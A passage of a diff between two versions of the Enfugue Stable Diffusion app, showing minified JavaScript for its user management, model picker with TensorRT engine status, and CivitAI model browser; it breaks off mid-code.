+import{MenuController}from"../menu.mjs";import{isEmpty}from"../../base/helpers.mjs";import{FormView}from"../../view/forms/base.mjs";import{ParentView}from"../../view/base.mjs";import{ModelTableView}from"../../view/table.mjs";import{CheckboxInputView,StringInputView,PasswordInputView,ButtonInputView}from"../../view/forms/input.mjs";class NewUserButtonInputView extends ButtonInputView{static className="new-user-input-view";static defaultValue="New User"}class UserForm extends FormView{static fieldSets={User:{username:{label:"Username",class:StringInputView,config:{required:!0,editable:!1,pattern:"^[a-zA-Z0-9_]{2,}$",minlength:2,maxlength:128}},first_name:{label:"First Name",class:StringInputView},last_name:{label:"Last Name",class:StringInputView}},Permissions:{admin:{label:"Administrator",class:CheckboxInputView}},Password:{new_password:{label:"New Password",class:PasswordInputView},repeat_password:{label:"Repeat Password",class:PasswordInputView}}};async build(){let e=await super.build();return isEmpty(this.values)||"enfugue"===this.values.username&&this.inputViews.filter((e=>"admin"===e.fieldName))[0].disable(),e}}class UsersTableView extends ModelTableView{static columns={username:"Username",name:"Name",type:"Type"};static columnFormatters={type:(e,s)=>!isEmpty(s.permission_groups)&&s.permission_groups.reduce(((e,s)=>e||"admin"===s.group[0].label),!1)?"Admin":"User",name:(e,s)=>`${s.first_name} ${s.last_name}`.trim()};static searchFields=["username","first_name","last_name"]}class UsersController extends MenuController{static menuName="Users";static menuIcon="fa-solid fa-users";static userWindowWidth=600;static userWindowHeight=500;getUser(){return this.model.get("/user")}updateUser(e){return this.model.post("/user",null,null,e)}static isDisabled(){return super.isDisabled()||isEmpty(window.enfugue)||"noauth"===window.enfugue.user}async getUserView(){isEmpty(this.tableView)&&(this.tableView=new UsersTableView(this.config,this.model.User),this.tableView.addButton("Edit","fa-solid fa-edit",(async e=>{let s=e.getAttributes();s.admin=!isEmpty(e.permission_groups)&&e.permission_groups.reduce(((e,s)=>e||"admin"===s.group[0].label),!1);let t=new UserForm(this.config,s),i=await this.spawnWindow(`Edit ${e.username}`,t,this.constructor.userWindowWidth,this.constructor.userWindowHeight);t.onSubmit((async s=>{t.clearError();try{if(!isEmpty(s.new_password)&&!isEmpty(s.repeat_password)){if(s.new_password!==s.repeat_password)throw"Passwords do not match.";e.stageChanges({new_password:s.new_password,repeat_password:s.repeat_password})}e.first_name=s.first_name,e.last_name=s.last_name,"enfugue"!==e.username&&e.stageChange("admin",s.admin),await e.save(),this.notify("info","Success",`User ${e.username} updated.`),i.remove(),isEmpty(this.tableView)||this.tableView.requery()}catch(e){let s=`${e}`;isEmpty(e.detail)?isEmpty(e.title)||(s=e.title):s=e.detail,t.setError(s),t.enable()}})),t.onCancel((()=>i.remove()))})),this.tableView.addButton("Delete","fa-solid fa-trash",(async e=>{if("enfugue"===e.username)return this.notify("warn","Forbidden","Deleting the default user is not allowed.");await e.delete(),isEmpty(this.tableView)||this.tableView.requery()}))),isEmpty(this.newUserView)&&(this.newUserView=new NewUserButtonInputView(this.config),this.newUserView.onChange((async()=>{if(isEmpty(this.newUserWindow)){let e=new UserForm(this.config);this.newUserWindow=await this.spawnWindow("New User",e,this.constructor.userWindowWidth,this.constructor.userWindowHeight),e.onSubmit((async s=>{e.clearError();try{if(isEmpty(s.new_password)||isEmpty(s.repeat_password))throw"Password is required.";if(s.new_password!==s.repeat_password)throw"Passwords do not match.";await this.model.User.create(s),this.notify("info","Success",`User ${s.username} created.`),this.newUserWindow.remove(),isEmpty(this.tableView)||this.tableView.requery()}catch(s){let t=`${s}`;isEmpty(s.detail)?isEmpty(s.title)||(t=s.title):t=s.detail,e.setError(t),e.enable()}})),e.onCancel((()=>this.newUserWindow.remove())),this.newUserWindow.onClose((()=>{this.newUserWindow=null}))}else this.newUserWindow.focus()})));let e=new ParentView(this.config);return await e.addChild(this.tableView),await e.addChild(this.newUserView),e}async showUserManager(){isEmpty(this.userManager)?(this.userManager=await this.spawnWindow("Users",await this.getUserView(),this.constructor.userWindowWidth,this.constructor.userWindowHeight),this.userManager.onClose((()=>{this.userManager=null}))):this.userManager.focus()}async onClick(){this.showUserManager()}}export{UsersController as MenuController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/common/model-picker.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/common/model-picker.mjs`

 * *Files 24% similar despite different names*

```diff
@@ -1 +1 @@
-import{Controller}from"../base.mjs";import{TableView}from"../../view/table.mjs";import{View}from"../../view/base.mjs";import{FormView}from"../../view/forms/base.mjs";import{SearchListInputView,StringInputView,SearchListInputListView}from"../../view/forms/input.mjs";import{MultiLoraInputView,MultiInversionInputView}from"./model-manager.mjs";import{isEmpty,waitFor,createElementsFromString}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";const E=new ElementBuilder;class ModelPickerListInputView extends SearchListInputListView{static classList=SearchListInputListView.classList.concat(["model-picker-list-input-view"])}class ModelPickerStringInputView extends StringInputView{setValue(t,e){return isEmpty(t)||(t=t.startsWith("<")?createElementsFromString(t)[0].innerText:t.split("/")[1]),super.setValue(t,e)}}class ModelPickerInputView extends SearchListInputView{static placeholder="Start typing to search models…";static stringInputClass=ModelPickerStringInputView;static listInputClass=ModelPickerListInputView}class AdditionalWeightsFormView extends FormView{static className="additional-weights-form-view";static autoSubmit=!0;static collapseFieldSets=!0;static fieldSets={"Additional Weights":{lora:{class:MultiLoraInputView,label:"LoRA",config:{tooltip:"LoRA stands for <strong>Low Rank Adapation</strong>, it is a kind of fine-tuning that can perform very specific modifications to Stable Diffusion such as training an individual's appearance, new products that are not in Stable Diffusion's training set, etc."}},inversion:{class:MultiInversionInputView,label:"Textual Inversion",config:{tooltip:"Textual Inversion is another kind of fine-tuning that teaches novel concepts to Stable Diffusion in a small number of images, which can be used to positively or negatively affect the impact of various prompts."}}}}}class ModelTensorRTTableView extends TableView{constructor(t,e,i){super(t,e),this.buildEngine=i}static canSort=!1;static columnFormatters={Build:function(t,e){if(!0===t)return E.span().content("Ready");{let i=E.button().content("Build").on("click",(async()=>{try{i.disabled(!0).addClass("loading-bar loading"),await this.buildEngine(e),i.removeClass("loading-bar").removeClass("loading").content("Ready")}catch(t){i.removeClass("loading-bar loading").disabled(!1)}}));return"building"===t&&i.disabled(!0).addClass("loading-bar loading"),i}}}}class ModelTensorRTStatusView extends View{static tagName="enfugue-tensorrt-status-view";static supportedNetworks={unet:"UNet",controlled_unet:"Controlled UNet",inpaint_unet:"Inpainting UNet"};static tensorRTDescription=["TensorRT is a technology created by Nvidia that transforms an AI model into one that takes advantage of hardware acceleration available on Nvidia GPUs.","As there are numerous varying architectures used by Nvidia that support this technology, these engines must be compiled by an architecture compatible with your actual hardware, rather than distributed by AI model providers.","The compilation time for each model varies, but generally takes between 15 and 30 minutes each. You can expect between 50% and 100% faster inference speeds during the engine's respective step(s).","The compiled engine is only useable for a model with the same checkpoint, LoRA, Textual Inversion and engine size. If you change any of those details about this model, it will require recompilation. You can safely change model prompts as desired without requiring a new engine."];static networkDescriptions={unet:"The network used when creating images with a prompt or base image.",controlled_unet:"The network used when creating images with a control image.",inpaint_unet:"The network used when inpainting or outpainting."};constructor(t,e,i){super(t),this.status=e,this.buildEngine=i}get tableData(){return Object.getOwnPropertyNames(this.constructor.supportedNetworks).map((t=>({"Network Name":this.constructor.supportedNetworks[t],Description:this.constructor.networkDescriptions[t],Build:this.status.building===t?"building":this.status[`${t}_ready`]})))}getNameFromLabel(t){for(let e in this.constructor.supportedNetworks)if(this.constructor.supportedNetworks[e]===t)return e;throw`Unknown network ${t}`}async build(){let t=await super.build(),e=new ModelTensorRTTableView(this.config,this.tableData,(t=>this.buildEngine(this.getNameFromLabel(t["Network Name"]))));for(let e of this.constructor.tensorRTDescription)t.append(E.p().class("margin").content(e));return t.append(await e.getNode())}}class ModelPickerFormView extends FormView{static className="model-picker";static autoSubmit=!0;static fieldSets={Model:{model:{class:ModelPickerInputView}}};static tensorRTLogo="/static/img/brand/tensorrt.png";setTensorRTStatus(t,e){let i=this.node.find("#tensorrt");if(t.supported){let s=ModelTensorRTStatusView.supportedNetworks,n=Object.getOwnPropertyNames(s),o=n.length,a=n.reduce(((e,i)=>(e[i]=t[`${i}_ready`],e)),{}),r=Object.values(a).filter((t=>t)).length;isEmpty(i)?(i=E.div().id("tensorrt").append(E.img().src(this.constructor.tensorRTLogo),E.span().class("fraction").content(E.span().content(`${r}`),E.span().content(`${o}`))).on("click",(()=>e())),this.node.append(i)):i.off("click").on("click",(()=>e())).find("span.fraction").content(E.span().content(`${r}`),E.span().content(`${o}`)),t.ready?i.addClass("ready").data("tooltip","TensorRT is <strong>ready</strong>"):i.removeClass("ready").data("tooltip","TensorRT is <strong>not ready</strong>")}else isEmpty(i)||this.node.remove(i)}}class ModelPickerController extends Controller{static tensorRTStatusWindowWidth=500;static tensorRTStatusWindowHeight=750;getState(){return{model:this.formView.values,weights:this.additionalWeightsFormView.values}}getDefaultState(){return{model:null,weights:null}}setState(t){isEmpty(t.model)||this.formView.setValues(t.model).then((()=>this.formView.submit())),isEmpty(t.weights)||this.additionalWeightsFormView.setValues(t.weights).then((()=>this.additionalWeightsFormView.submit()))}async buildEngine(t,e){await this.model.post(`/models/${t}/tensorrt/${e}`),this.notify("info","Build Started","The engine will be busy throughout this TensorRT build. You will see a notification when it is complete, and the status indicator in the top bar will show ready or idle."),await waitFor((()=>!isEmpty(this.builtEngines[t])&&-1!==this.builtEngines[t].indexOf(e)),{interval:5e3})}async showBuildTensorRT(t){let e=await t.getTensorRTStatus(),i=await this.getCurrentEngineBuildProcess();isEmpty(i)||i.metadata.tensorrt_build.model!==t.name||(e.building=i.metadata.tensorrt_build.network);let s=new ModelTensorRTStatusView(this.config,e,(e=>this.buildEngine(t.name,e)));return await this.spawnWindow(`${t.name} TensorRT Status`,s,this.constructor.tensorRTStatusWindowWidth,this.constructor.tensorRTStatusWindowHeight)}async getCurrentEngineBuildProcess(){let t=await this.model.get("/invocation");for(let e of t)if(void 0!==e.metadata&&void 0!==e.metadata.tensorrt_build&&-1!==["queued","processing"].indexOf(e.status))return e;return null}async initialize(){this.builtEngines={},ModelPickerInputView.defaultOptions=async()=>(await this.model.get("/model-options")).reduce(((t,e)=>{let i="checkpoint"===e.type?"Checkpoint":"Preconfigured Model";return t[`${e.type}/${e.name}`]=`<strong>${e.name}</strong><em>${i}</em>`,t}),{}),this.formView=new ModelPickerFormView(this.config),this.additionalWeightsFormView=new AdditionalWeightsFormView(this.config),this.formView.onSubmit((async t=>{if(t.model){let[e,i]=t.model.split("/");if(this.engine.model=i,this.engine.modelType=e,"model"===e){this.additionalWeightsFormView.hide();try{let t=await this.model.DiffusionModel.query({name:i}),e=await t.getTensorRTStatus();this.publish("modelPickerChange",t),this.formView.setTensorRTStatus(e,(()=>this.showBuildTensorRT(t)))}catch(t){this.formView.setValues({model:null})}}else this.additionalWeightsFormView.show(),this.formView.setTensorRTStatus({supported:!1})}else this.formView.setTensorRTStatus({supported:!1})})),this.additionalWeightsFormView.onSubmit((async t=>{this.engine.lora=t.lora,this.engine.inversion=t.inversion})),this.application.container.appendChild(await this.formView.render()),this.application.container.appendChild(await this.additionalWeightsFormView.render()),this.subscribe("invocationError",(t=>{if(console.error(t),!isEmpty(t.metadata)&&!isEmpty(t.metadata.tensorrt_build)){let e=t.metadata.tensorrt_build.network,i=ModelTensorRTStatusView.supportedNetworks[e],s=t.metadata.tensorrt_build.model;this.notify("info","TensorRT Engine Build Failed",`${s} ${i} TensorRT Engine failed to build. Please try again.`)}})),this.subscribe("invocationComplete",(t=>{if(!isEmpty(t.metadata)&&!isEmpty(t.metadata.tensorrt_build)){let e=t.metadata.tensorrt_build.network,i=ModelTensorRTStatusView.supportedNetworks[e],s=t.metadata.tensorrt_build.model;this.notify("info","TensorRT Engine Build Complete",`Successfully built ${s} ${i} TensorRT Engine.`),isEmpty(this.builtEngines[s])&&(this.builtEngines[s]=[]),this.builtEngines[s].push(e)}}))}}export{ModelPickerController};
+import{Controller}from"../base.mjs";import{TableView}from"../../view/table.mjs";import{View}from"../../view/base.mjs";import{FormView}from"../../view/forms/base.mjs";import{SearchListInputView,StringInputView,SearchListInputListView,NumberInputView}from"../../view/forms/input.mjs";import{VAEInputView,CheckpointInputView,MultiLoraInputView,MultiLycorisInputView,MultiInversionInputView}from"./model-manager.mjs";import{isEmpty,waitFor,createElementsFromString}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";const E=new ElementBuilder;class ModelPickerListInputView extends SearchListInputListView{static classList=SearchListInputListView.classList.concat(["model-picker-list-input-view"])}class ModelPickerStringInputView extends StringInputView{setValue(e,t){return isEmpty(e)||(e=e.startsWith("<")?createElementsFromString(e)[0].innerText:e.split("/")[1]),super.setValue(e,t)}}class ModelPickerInputView extends SearchListInputView{static placeholder="Start typing to search models…";static stringInputClass=ModelPickerStringInputView;static listInputClass=ModelPickerListInputView}class ModelConfigurationFormView extends FormView{static className="model-configuration-form-view";static autoSubmit=!0;static collapseFieldSets=!0;static fieldSets={"Adaptations and Modifications":{lora:{class:MultiLoraInputView,label:"LoRA",config:{tooltip:"LoRA stands for <strong>Low Rank Adapation</strong>, it is a kind of fine-tuning that can perform very specific modifications to Stable Diffusion such as training an individual's appearance, new products that are not in Stable Diffusion's training set, etc."}},lycoris:{class:MultiLycorisInputView,label:"LyCORIS",config:{tooltip:"LyCORIS stands for <strong>LoRA beYond Conventional methods, Other Rank adaptation Implementations for Stable diffusion</strong>, a novel means of performing low-rank adaptation introduced in early 2023."}},inversion:{class:MultiInversionInputView,label:"Textual Inversion",config:{tooltip:"Textual Inversion is another kind of fine-tuning that teaches novel concepts to Stable Diffusion in a small number of images, which can be used to positively or negatively affect the impact of various prompts."}}},"Additional Models":{vae:{label:"VAE",class:VAEInputView},refiner:{label:"Refining Checkpoint",class:CheckpointInputView,config:{tooltip:"Refining checkpoints were introduced with SDXL 0.9 - these are checkpoints specifically trained to improve detail, shapes, and generally improve the quality of images generated from the base model. These are optional, and do not need to be specifically-trained refinement checkpoints - you can try mixing and matching checkpoints for different styles, though you may wish to ensure the related checkpoints were trained on the same size images."}},inpainter:{label:"Inpainting Checkpoint",class:CheckpointInputView,config:{tooltip:"An inpainting checkpoint if much like a regular Stable Diffusion checkpoint, but it additionally includes the ability to input which parts of the image can be changed and which cannot. This is used when you specifically request an image be inpainted, but is also used in many other situations in Enfugue; such as when you place an image on the canvas that doesn't cover the entire space, or use an image that has transparency in it (either before or after removing it's background.) When you don't select an inpainting checkpoint and request an inpainting operation, one will be created dynamically from the main checkpoint at runtime."}}}}}class ModelTensorRTTableView extends TableView{constructor(e,t,i){super(e,t),this.buildEngine=i}static canSort=!1;static columnFormatters={Build:function(e,t){if(!0===e)return E.span().content("Ready");{let i=E.button().content("Build").on("click",(async()=>{try{i.disabled(!0).addClass("loading-bar loading"),await this.buildEngine(t),i.removeClass("loading-bar").removeClass("loading").content("Ready")}catch(e){i.removeClass("loading-bar loading").disabled(!1)}}));return"building"===e&&i.disabled(!0).addClass("loading-bar loading"),i}}}}class ModelTensorRTStatusView extends View{static tagName="enfugue-tensorrt-status-view";static supportedNetworks={unet:"UNet",controlled_unet:"Controlled UNet",inpaint_unet:"Inpainting UNet"};static tensorRTDescription=["TensorRT is a technology created by Nvidia that transforms an AI model into one that takes advantage of hardware acceleration available on Nvidia GPUs.","As there are numerous varying architectures used by Nvidia that support this technology, these engines must be compiled by an architecture compatible with your actual hardware, rather than distributed by AI model providers.","The compilation time for each model varies, but generally takes between 15 and 30 minutes each. You can expect between 50% and 100% faster inference speeds during the engine's respective step(s).","The compiled engine is only useable for a model with the same checkpoint, LoRA, LyCORIS, Textual Inversion and engine size. If you change any of those details about this model, it will require recompilation. You can safely change model prompts as desired without requiring a new engine."];static networkDescriptions={unet:"The network used when creating images with a prompt or base image.",controlled_unet:"The network used when creating images with a control image.",inpaint_unet:"The network used when inpainting or outpainting."};constructor(e,t,i){super(e),this.status=t,this.buildEngine=i}get tableData(){return Object.getOwnPropertyNames(this.constructor.supportedNetworks).map((e=>({"Network Name":this.constructor.supportedNetworks[e],Description:this.constructor.networkDescriptions[e],Build:this.status.building===e?"building":this.status[`${e}_ready`]})))}getNameFromLabel(e){for(let t in this.constructor.supportedNetworks)if(this.constructor.supportedNetworks[t]===e)return t;throw`Unknown network ${e}`}async build(){let e=await super.build(),t=new ModelTensorRTTableView(this.config,this.tableData,(e=>this.buildEngine(this.getNameFromLabel(e["Network Name"]))));for(let t of this.constructor.tensorRTDescription)e.append(E.p().class("margin").content(t));return e.append(await t.getNode())}}class ModelPickerFormView extends FormView{static className="model-picker";static autoSubmit=!0;static fieldSets={Model:{model:{class:ModelPickerInputView}}};static tensorRTLogo="/static/img/brand/tensorrt.png";setTensorRTStatus(e,t){let i=this.node.find("#tensorrt");if(e.supported){let n=ModelTensorRTStatusView.supportedNetworks,s=Object.getOwnPropertyNames(n),o=s.length,a=s.reduce(((t,i)=>(t[i]=e[`${i}_ready`],t)),{}),r=Object.values(a).filter((e=>e)).length;isEmpty(i)?(i=E.div().id("tensorrt").append(E.img().src(this.constructor.tensorRTLogo),E.span().class("fraction").content(E.span().content(`${r}`),E.span().content(`${o}`))).on("click",(()=>t())),this.node.append(i)):i.off("click").on("click",(()=>t())).find("span.fraction").content(E.span().content(`${r}`),E.span().content(`${o}`)),e.ready?i.addClass("ready").data("tooltip","TensorRT is <strong>ready</strong>"):i.removeClass("ready").data("tooltip","TensorRT is <strong>not ready</strong>")}else isEmpty(i)||this.node.remove(i)}}class ModelPickerController extends Controller{static tensorRTStatusWindowWidth=500;static tensorRTStatusWindowHeight=750;getState(){return{model:this.formView.values,modelConfig:this.modelConfigurationFormView.values}}getDefaultState(){return{model:null,modelConfig:null}}setState(e){isEmpty(e.model)||(this.formView.suppressDefaults=!0,this.formView.setValues(e.model).then((()=>this.formView.submit()))),isEmpty(e.modelConfig)||this.modelConfigurationFormView.setValues(e.modelConfig).then((()=>this.modelConfigurationFormView.submit()))}async buildEngine(e,t){await this.model.post(`/models/${e}/tensorrt/${t}`),this.notify("info","Build Started","The engine will be busy throughout this TensorRT build. You will see a notification when it is complete, and the status indicator in the top bar will show ready or idle."),await waitFor((()=>!isEmpty(this.builtEngines[e])&&-1!==this.builtEngines[e].indexOf(t)),{interval:5e3})}async showBuildTensorRT(e){let t=await e.getStatus(),i=await this.getCurrentEngineBuildProcess(),n={supported:!1};isEmpty(t.tensorrt)||(n=t.tensorrt.base,isEmpty(t.tensorrt.inpainter)||(n.inpaint_unet_ready=t.tensorrt.inpainter.unet_ready)),isEmpty(i)||i.metadata.tensorrt_build.model!==e.name||(t.building=i.metadata.tensorrt_build.network);let s=new ModelTensorRTStatusView(this.config,n,(t=>this.buildEngine(e.name,t)));return await this.spawnWindow(`${e.name} TensorRT Status`,s,this.constructor.tensorRTStatusWindowWidth,this.constructor.tensorRTStatusWindowHeight)}async getCurrentEngineBuildProcess(){let e=await this.model.get("/invocation");for(let t of e)if(void 0!==t.metadata&&void 0!==t.metadata.tensorrt_build&&-1!==["queued","processing"].indexOf(t.status))return t;return null}async initialize(){this.builtEngines={},ModelPickerInputView.defaultOptions=async()=>(await this.model.get("/model-options")).reduce(((e,t)=>{let i="checkpoint"===t.type?"Checkpoint":"Preconfigured Model";return e[`${t.type}/${t.name}`]=`<strong>${t.name}</strong><em>${i}</em>`,e}),{}),this.formView=new ModelPickerFormView(this.config),this.modelConfigurationFormView=new ModelConfigurationFormView(this.config),this.formView.onSubmit((async e=>{let t=this.formView.suppressDefaults;if(this.formView.suppressDefaults=!1,e.model){let[i,n]=e.model.split("/");if(this.engine.model=n,this.engine.modelType=i,"model"===i){this.modelConfigurationFormView.hide();try{let e=await this.model.DiffusionModel.query({name:n}),i=await e.getStatus(),s={supported:!1};e.status=i,t&&(e._relationships.config=null),this.publish("modelPickerChange",e),isEmpty(i.tensorrt)||(s=i.tensorrt.base,isEmpty(i.tensorrt.inpainter)||(s.inpaint_unet_ready=i.tensorrt.inpainter.unet_ready)),this.formView.setTensorRTStatus(s,(()=>this.showBuildTensorRT(e)))}catch(e){this.formView.setValues({model:null}),console.error(e)}}else this.modelConfigurationFormView.show(),this.formView.setTensorRTStatus({supported:!1})}else this.formView.setTensorRTStatus({supported:!1})})),this.modelConfigurationFormView.onSubmit((async e=>{this.engine.refiner=e.refiner,this.engine.inpainter=e.inpainter,this.engine.lora=e.lora,this.engine.lycoris=e.lycoris,this.engine.inversion=e.inversion,this.engine.vae=e.vae})),this.application.container.appendChild(await this.formView.render()),this.application.container.appendChild(await this.modelConfigurationFormView.render()),this.subscribe("invocationError",(e=>{if(console.error(e),!isEmpty(e.metadata)&&!isEmpty(e.metadata.tensorrt_build)){let t=e.metadata.tensorrt_build.network,i=ModelTensorRTStatusView.supportedNetworks[t],n=e.metadata.tensorrt_build.model;this.notify("info","TensorRT Engine Build Failed",`${n} ${i} TensorRT Engine failed to build. Please try again.`)}})),this.subscribe("invocationComplete",(e=>{if(!isEmpty(e.metadata)&&!isEmpty(e.metadata.tensorrt_build)){let t=e.metadata.tensorrt_build.network,i=ModelTensorRTStatusView.supportedNetworks[t],n=e.metadata.tensorrt_build.model;this.notify("info","TensorRT Engine Build Complete",`Successfully built ${n} ${i} TensorRT Engine.`),isEmpty(this.builtEngines[n])&&(this.builtEngines[n]=[]),this.builtEngines[n].push(t)}}))}}export{ModelPickerController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/file/02-open.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/file/02-open.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/file/03-save.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/file/03-save.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/file/04-history.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/file/04-history.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/file/05-results.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/file/05-results.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/help/01-about.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/help/01-about.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/index.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/index.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/models/01-civitait.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/models/01-civitait.mjs`

 * *Files 20% similar despite different names*

```diff
@@ -1 +1 @@
-import{MenuController}from"../menu.mjs";import{isEmpty,humanSize,truncate}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{View,ParentView,TabbedView}from"../../view/base.mjs";import{SimpleNotification}from"../../common/notify.mjs";import{FormView}from"../../view/forms/base.mjs";import{StringInputView,SelectInputView,CheckboxInputView}from"../../view/forms/input.mjs";const E=new ElementBuilder,browserWindowDimensions=[800,1e3];class CivitAISortInputView extends SelectInputView{static defaultOptions=["Highest Rated","Most Downloaded","Newest"];static defaultValue="Highest Rated"}class CivitAITimePeriodInputView extends SelectInputView{static defaultOptions={AllTime:"All Time",Year:"This Year",Month:"This Month",Week:"This Week",Day:"Today"};static defaultValue="Month"}class CivitAISearchOptionsFormView extends FormView{static fieldSets={Sorting:{sort:{label:"Sort Method",class:CivitAISortInputView},period:{label:"Time Period",class:CivitAITimePeriodInputView}},Filters:{commercial:{label:"Only Show Models Allowing Commercial Use",class:CheckboxInputView},search:{class:StringInputView,config:{placeholder:"Search by name, user, description, etc."}}}}}class CivitAIItemView extends View{static className="civit-ai-item";static maxImagesPerItem=3;static maxCharactersPerDescription=300;static maxTags=6;constructor(t,e,i){super(t),this.item=e,this.download=i}async build(){let t=await super.build(),e=this.item.modelVersions[0].name,i=E.h2().content(this.item.name),s=E.h4().content(`By ${this.item.creator.username}`),o=E.select(),a=E.div().class("versions"),n=E.div().class("flags"),r=E.div().class("tags"),l=E.p(),c=()=>{let t=this.item.modelVersions.filter((t=>t.name===e)).shift(),i=t.trainedWords,s=t.images.slice(0,this.constructor.maxImagesPerItem),o=s.map((t=>{let e=E.img().src(t.url).css({"max-width":`${(1/s.length*100).toFixed(2)}%`});return isEmpty(t.meta)||isEmpty(t.meta.prompt)||(navigator.clipboard?(e.data("tooltip",`${t.meta.prompt}<br /><em class='note'>Ctrl+Right Click to copy prompt.</em>`),e.on("contextmenu",(e=>{e.ctrlKey&&(e.preventDefault(),e.stopPropagation(),navigator.clipboard.writeText(t.meta.prompt),SimpleNotification.notify("Copied to Clipboard",1e3))}))):e.data("tooltip",t.meta.prompt)),e})),n=i.map((t=>E.span().content(t))),r=t.files.map((t=>E.div().class("download").content(E.span().class("name").content(t.name),E.span().class("type").content(`${t.metadata.size||""} ${t.metadata.fp||""}`),E.span().class("format").content(t.metadata.format),E.span().class("size").content(humanSize(1e3*t.sizeKB)),E.a().content(E.i().class("fa-solid fa-download")).data("tooltip","Start Download").on("click",(e=>{this.download(t.downloadUrl,t.name)})))));a.content(E.div().class("downloads").content(...r),E.div().class("images").content(...o),E.div().class("triggers").content(...n))};if(!isEmpty(this.item.description))if(this.item.description.length<=this.constructor.maxCharactersPerDescription)l.content(this.item.description);else{let t=E.span().content(truncate(this.item.description,this.constructor.maxCharactersPerDescription)),e=E.span().content(this.item.description).hide(),i=E.a().content("Show All").on("click",(()=>{t.hide(),i.hide(),e.show()}));l.content(t,i,e)}for(let t of this.item.tags.slice(0,this.constructor.maxTags))r.append(E.span().content(t));"None"===this.item.allowCommercialUse?n.append(E.span().content("Commercial Use Disallowed")):"Image"===this.item.allowCommercialUse?n.append(E.span().content("Commercial Use Allowed (Images Only)")):"Rent"===this.item.allowCommercialUse||"Sell"===this.item.allowCommercialUse?n.append(E.span().content("Commercial Use Allowed")):console.warning(`Unknown commercial use state '${this.item.allowCommercialUse}'`),this.item.allowNoCredit?n.append(E.span().content("No Credit Required")):n.append(E.span().content("Credit Required")),this.item.allowDerivatives?n.append(E.span().content("Derivative Models Allowed")):n.append(E.span().content("Derivative Models Disallowed"));for(let t of this.item.modelVersions){let i=E.option().content(t.name);t.name===e&&i.selected(!0),o.append(i)}return o.on("change",(t=>{e=o.val(),c()})),o.val(e),c(),t.append(i).append(s).append(n).append(r).append(l).append(o).append(a),t}}class CivitAICategoryPageView extends View{static className="page-buttons";constructor(t,e,i){super(t),this.showPrevious=e,this.showNext=i,this.onPreviousCallbacks=[],this.onNextCallbacks=[]}onNext(t){this.onNextCallbacks.push(t)}onPrevious(t){this.onPreviousCallbacks.push(t)}previousPage(){for(let t of this.onPreviousCallbacks)t()}nextPage(){for(let t of this.onNextCallbacks)t()}async build(){let t=await super.build(),e=E.button().content("Previous Page").on("click",(()=>this.previousPage())),i=E.button().content("Next Page").on("click",(()=>this.nextPage()));return this.showPrevious||e.disabled(!0),this.showNext||i.disabled(!0),t.content(e,i)}}class CivitAICategoryBrowserView extends ParentView{static inputTimeout=500;static pageSize=20;constructor(t,e,i){super(t),this.getData=e,this.download=i,this.page=1,this.query="",this.timer=null,this.options=new CivitAISearchOptionsFormView(t),this.options.onSubmit((async t=>{try{await this.runQuery(t)}catch(t){SimpleNotification.notify("Couldn't communicate with Enfugue or CivitAI. Please try again."),console.error(t)}this.options.enable()})),this.empty(),this.addChild(this.options)}async runQuery(t){this.empty(),this.addChild(this.options);let e={page:this.page};isEmpty(t.search)||(e.query=t.search),isEmpty(t.sort)||(e.sort=t.sort),isEmpty(t.period)||(e.period=t.period),!0===t.commercial&&(e.allow_commercial_use="Image");for(let t of await this.getData(null,e)){let e=new CivitAIItemView(this.config,t,((...t)=>this.download(...t)));await this.addChild(e)}let i=new CivitAICategoryPageView(this.config,this.page>1,this.children.length>this.constructor.pageSize);i.onNext((async()=>{this.page++,this.options.disable(),await this.runQuery(t),this.options.enable()})),i.onPrevious((async()=>{this.page--,this.options.disable(),await this.runQuery(t),this.options.enable()})),await this.addChild(i)}async build(){let t=await super.build();return this.options.submit(),t}}class CivitAIBrowserView extends TabbedView{constructor(t,e,i){super(t),this.addTab("Checkpoints",new CivitAICategoryBrowserView(t,((...t)=>e("checkpoint",...t)),((...t)=>i("checkpoint",...t)))),this.addTab("LoRA",new CivitAICategoryBrowserView(t,((...t)=>e("lora",...t)),((...t)=>i("lora",...t)))),this.addTab("Textual Inversion",new CivitAICategoryBrowserView(t,((...t)=>e("inversion",...t)),((...t)=>i("inversion",...t))))}}class CivitAIView extends View{static logoPath="/static/img/brand/civit-ai-logo.svg";static className="civit-ai-view";constructor(t,e,i){super(t),this.browser=new CivitAIBrowserView(t,e,i)}getDescriptionNode(){return E.div().content(E.a().href("https://civitai.com").target("_blank").content(E.img().src(this.constructor.logoPath)),E.p().content("CivitAI is the leading AI model sharing service, providing a place where creators can uploads their trained models for other users to enjoy and employ."),E.p().content(E.span().content("By downloading any models from CivitAI, you agree to their "),E.a().href("https://civitai.com/content/tos").target("_blank").content("terms of service"),E.span().content(". Please review these terms before downloading anything. Some models come with additional terms, such as disallowing sale of images derived from those models. Use the filters at the top to only search for your desired terms, or pay attention to the tags below the model's name and author.")),E.p().content(E.span().content("If you enjoy the service CivitAI provides, please consider "),E.a().href("https://civitai.com/pricing").target("_blank").content("subscribing or donating"),E.span().content(" to support free and open-source AI.")),E.p().class("center").content(E.em().class("note").content("CivitAI, the CivitAI logo, and the CivitAI 'C' icon are all &copy; CivitAI "+(new Date).getFullYear()+", all rights reserved.")))}async build(){let t=await super.build();return t.append(this.getDescriptionNode()),t.append(await this.browser.getNode()),t}}class CivitAIController extends MenuController{static menuName="Civit AI";static menuIcon="/static/img/brand/civit-ai.png";async 